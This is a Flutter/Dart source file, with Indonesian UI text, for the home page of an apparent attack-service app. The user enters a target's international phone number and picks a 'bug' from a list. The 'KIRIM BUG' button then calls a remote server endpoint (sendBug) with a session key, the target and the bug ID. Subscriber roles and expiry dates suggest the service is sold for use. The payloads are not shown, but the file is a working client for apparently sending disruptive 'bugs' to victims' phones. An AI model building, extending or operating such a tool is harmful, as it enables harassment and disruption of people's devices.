import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  late AnimationController _slideController;
  late Animation<Offset> _slideAnimation;
  String selectedBugId = "";

  bool _isSending = false;
  String? _responseMessage;

  // Video Player Variables
  late VideoPlayerController _videoController;
  late ChewieController _chewieController;
  bool _isVideoInitialized = false;

  // --- PERUBAHAN TEMA WARNA ---
  // Wana tema diubah menjadi merah tua dan hitam
  final Color darkRed = const Color(0xFFB71C1C); // Merah tua utama
  final Color accentRed = const Color(0xFFFF5252); // Merah lebih terang untuk aksen
  final Color glassBlack = Colors.black.withOpacity(0.4); // Sedikit lebih gelap untuk kontras

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2000),
    )..repeat(reverse: true);

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    )..forward();

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.5),
      end: Offset.zero,
    ).animate(CurvedAnimation(
      parent: _slideController,
      curve: Curves.easeOutCubic,
    ));

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    // Initialize video player from assets
    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset(
      'assets/videos/banner.mp4',
    );

    _videoController.initialize().then((_) {
      setState(() {
        _videoController.setVolume(0.1);
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          autoInitialize: true,
          errorBuilder: (context, errorMessage) {
            return Container(
              height: 120,
              decoration: BoxDecoration(
                // --- PERUBAHAN GRADIENT ---
                gradient: LinearGradient(
                  colors: [darkRed.withOpacity(0.3), accentRed.withOpacity(0.3)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(20),
              ),
              // --- PERUBAHAN IKON ---
              child: Center(child: Icon(Icons.play_arrow, color: accentRed, size: 40)),
            );
          },
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      print("Video initialization error: $error");
      setState(() {
        _isVideoInitialized = false;
      });
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    _slideController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "https://tr4s.nullxteam.fun/sendBug?key=$key&target=$target&bug=$selectedBugId"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage =
        "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug ke $target!");
        targetController.clear();
      }
    } catch (_) {
      setState(() =>
      _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: AlertDialog(
          backgroundColor: glassBlack,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            // --- PERUBAHAN BORDER ---
            side: BorderSide(color: darkRed.withOpacity(0.3), width: 1.5),
          ),
          title: ShaderMask(
            shaderCallback: (bounds) => LinearGradient(
              // --- PERUBAHAN GRADIENT ---
              colors: [darkRed, accentRed],
            ).createShader(bounds),
            child: Text(title, style: const TextStyle(fontWeight: FontWeight.bold)),
          ),
          content: Text(msg, style: const TextStyle(color: Colors.white70)),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              // --- PERUBAHAN TEKS ---
              child: Text("OK", style: TextStyle(color: accentRed)),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildGlassCard({required Widget child, EdgeInsetsGeometry? padding}) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 8),
      padding: padding ?? const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            Colors.white.withOpacity(0.15),
            Colors.white.withOpacity(0.08),
          ],
        ),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(
          color: Colors.white.withOpacity(0.3),
          width: 1.5,
        ),
        boxShadow: [
          // --- PERUBAHAN BAYANGAN ---
          BoxShadow(
            color: darkRed.withOpacity(0.15),
            blurRadius: 25,
            spreadRadius: 2,
          ),
        ],
      ),
      child: child,
    );
  }

  Widget _buildHeaderPanel() {
    return SlideTransition(
      position: _slideAnimation,
      child: Container(
        margin: const EdgeInsets.symmetric(vertical: 8),
        height: 220, // Fixed height untuk video background
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(24),
          boxShadow: [
            // --- PERUBAHAN BAYANGAN ---
            BoxShadow(
              color: darkRed.withOpacity(0.2),
              blurRadius: 20,
              spreadRadius: 2,
            ),
          ],
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(24),
          child: Stack(
            fit: StackFit.expand,
            children: [
              // Video Background
              if (_isVideoInitialized)
                Chewie(controller: _chewieController)
              else
                Container(
                  decoration: BoxDecoration(
                    // --- PERUBAHAN GRADIENT ---
                    gradient: LinearGradient(
                      colors: [darkRed.withOpacity(0.3), accentRed.withOpacity(0.3)],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                  ),
                  child: Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        // --- PERUBAHAN IKON ---
                        Icon(Icons.play_arrow, color: accentRed, size: 40),
                        const SizedBox(height: 8),
                        Text(
                          "Loading Video...",
                          // --- PERUBAHAN TEKS ---
                          style: TextStyle(color: accentRed),
                        ),
                      ],
                    ),
                  ),
                ),

              // Gradient Overlay untuk readability
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.black.withOpacity(0.7),
                      Colors.transparent,
                      Colors.black.withOpacity(0.8),
                    ],
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    stops: const [0.0, 0.5, 1.0],
                  ),
                ),
              ),

              // Glassmorphism Content
              BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
                child: Container(
                  padding: const EdgeInsets.all(20),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(24),
                  ),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      // Animated Logo
                      FadeTransition(
                        opacity: Tween(begin: 0.6, end: 1.0).animate(_fadeController),
                        child: Container(
                          padding: const EdgeInsets.all(4),
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            // --- PERUBAHAN GRADIENT ---
                            gradient: LinearGradient(
                              colors: [darkRed.withOpacity(0.4), accentRed.withOpacity(0.4)],
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                            ),
                            boxShadow: [
                              // --- PERUBAHAN BAYANGAN ---
                              BoxShadow(
                                color: darkRed.withOpacity(0.3),
                                blurRadius: 20,
                                spreadRadius: 3,
                              ),
                            ],
                          ),
                          child: const CircleAvatar(
                            radius: 40,
                            backgroundImage: AssetImage('assets/images/logo.jpg'),
                          ),
                        ),
                      ),
                      const SizedBox(height: 16),

                      // Username
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          // --- PERUBAHAN GRADIENT ---
                          colors: [darkRed, Colors.white],
                        ).createShader(bounds),
                        child: Text(
                          widget.username,
                          style: const TextStyle(
                            fontWeight: FontWeight.bold,
                            fontSize: 22,
                            letterSpacing: 1.2,
                          ),
                        ),
                      ),

                      const SizedBox(height: 8),

                      // Role & Expiry
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              // --- PERUBAHAN WARNA ---
                              color: darkRed.withOpacity(0.3),
                              borderRadius: BorderRadius.circular(12),
                              // --- PERUBAHAN BORDER ---
                              border: Border.all(color: darkRed.withOpacity(0.6)),
                            ),
                            child: Text(
                              widget.role.toUpperCase(),
                              style: const TextStyle(
                                color: Colors.white,
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.2),
                              borderRadius: BorderRadius.circular(12),
                              border: Border.all(color: Colors.white.withOpacity(0.4)),
                            ),
                            child: Text(
                              "Exp: ${widget.expiredDate}",
                              style: const TextStyle(
                                color: Colors.white,
                                fontSize: 12,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    return SlideTransition(
      position: _slideAnimation,
      child: _buildGlassCard(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            // Phone Input
            Row(
              children: [
                // --- PERUBAHAN IKON ---
                Icon(Icons.phone_android, color: accentRed),
                const SizedBox(width: 8),
                Text(
                  "Nomor Target",
                  // --- PERUBAHAN TEKS ---
                  style: TextStyle(
                    color: accentRed,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(16),
                gradient: LinearGradient(
                  colors: [
                    Colors.white.withOpacity(0.1),
                    Colors.white.withOpacity(0.05),
                  ],
                ),
              ),
              child: TextField(
                controller: targetController,
                style: const TextStyle(color: Colors.white),
                // --- PERUBAHAN KURSOR ---
                cursorColor: accentRed,
                decoration: InputDecoration(
                  hintText: "Contoh: +62xxxxxxxxxx",
                  hintStyle: const TextStyle(color: Colors.white54),
                  filled: false,
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    // --- PERUBAHAN BORDER ---
                    borderSide: BorderSide(color: darkRed.withOpacity(0.5)),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    // --- PERUBAHAN BORDER ---
                    borderSide: BorderSide(color: accentRed, width: 2),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(16),
                    borderSide: BorderSide(color: Colors.white.withOpacity(0.3)),
                  ),
                  contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
                ),
              ),
            ),

            const SizedBox(height: 24),

            // Bug Selection
            Row(
              children: [
                // --- PERUBAHAN IKON ---
                Icon(Icons.bug_report, color: accentRed),
                const SizedBox(width: 8),
                Text(
                  "Pilih Bug",
                  // --- PERUBAHAN TEKS ---
                  style: TextStyle(
                    color: accentRed,
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(16),
                gradient: LinearGradient(
                  colors: [
                    Colors.white.withOpacity(0.1),
                    Colors.white.withOpacity(0.05),
                  ],
                ),
                border: Border.all(color: Colors.white.withOpacity(0.3)),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: Colors.black,
                  value: selectedBugId,
                  isExpanded: true,
                  // --- PERUBAHAN IKON ---
                  iconEnabledColor: accentRed,
                  style: const TextStyle(color: Colors.white),
                  items: widget.listBug.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Text(
                        bug['bug_name'],
                        style: const TextStyle(color: Colors.white),
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      selectedBugId = value ?? "";
                    });
                  },
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSendButton() {
    return SlideTransition(
      position: _slideAnimation,
      child: AnimatedBuilder(
        animation: _pulseController,
        builder: (context, child) {
          return Container(
            margin: const EdgeInsets.only(top: 16),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              // --- PERUBAHAN GRADIENT ---
              gradient: LinearGradient(
                colors: [
                  darkRed.withOpacity(0.8),
                  accentRed.withOpacity(0.8),
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              boxShadow: [
                // --- PERUBAHAN BAYANGAN ---
                BoxShadow(
                  color: darkRed.withOpacity(0.4 * _pulseController.value),
                  blurRadius: 25 * _pulseController.value,
                  spreadRadius: 3 * _pulseController.value,
                ),
              ],
            ),
            child: ElevatedButton(
              onPressed: _isSending ? null : _sendBug,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                padding: const EdgeInsets.symmetric(vertical: 18),
                shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(20),
                ),
              ),
              child: _isSending
                  ? const SizedBox(
                height: 24,
                width: 24,
                child: CircularProgressIndicator(
                  color: Colors.white,
                  strokeWidth: 3,
                ),
              )
                  : Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.send, color: Colors.white, size: 22),
                  const SizedBox(width: 12),
                  Text(
                    "KIRIM BUG",
                    style: TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontSize: 18,
                      letterSpacing: 1.5,
                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    return SlideTransition(
      position: _slideAnimation,
      child: Container(
        margin: const EdgeInsets.only(top: 20),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: _responseMessage!.startsWith('✅')
                ? [Colors.green.withOpacity(0.3), Colors.greenAccent.withOpacity(0.1)]
                : [Colors.red.withOpacity(0.3), Colors.redAccent.withOpacity(0.1)],
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: _responseMessage!.startsWith('✅')
                ? Colors.greenAccent.withOpacity(0.5)
                : Colors.redAccent.withOpacity(0.5),
            width: 1.5,
          ),
        ),
        child: Row(
          children: [
            Icon(
              _responseMessage!.startsWith('✅') ? Icons.check_circle : Icons.error,
              color: _responseMessage!.startsWith('✅') ? Colors.greenAccent : Colors.redAccent,
              size: 24,
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: _responseMessage!.startsWith('✅') ? Colors.greenAccent : Colors.redAccent,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // --- PERUBAHAN BACKGROUND ---
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // Background Effects
          Positioned(
            top: -100,
            right: -100,
            child: Container(
              width: 300,
              height: 300,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  // --- PERUBAHAN GRADIENT ---
                  colors: [
                    darkRed.withOpacity(0.1),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),
          Positioned(
            bottom: -150,
            left: -100,
            child: Container(
              width: 400,
              height: 400,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: RadialGradient(
                  // --- PERUBAHAN GRADIENT ---
                  colors: [
                    accentRed.withOpacity(0.08),
                    Colors.transparent,
                  ],
                ),
              ),
            ),
          ),

          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: SafeArea(
              child: SingleChildScrollView(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.center,
                  children: [
                    _buildHeaderPanel(), // Sekarang header panel sudah include video background
                    const SizedBox(height: 24),
                    _buildInputPanel(),
                    _buildSendButton(),
                    _buildResponseMessage(),
                    const SizedBox(height: 20),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}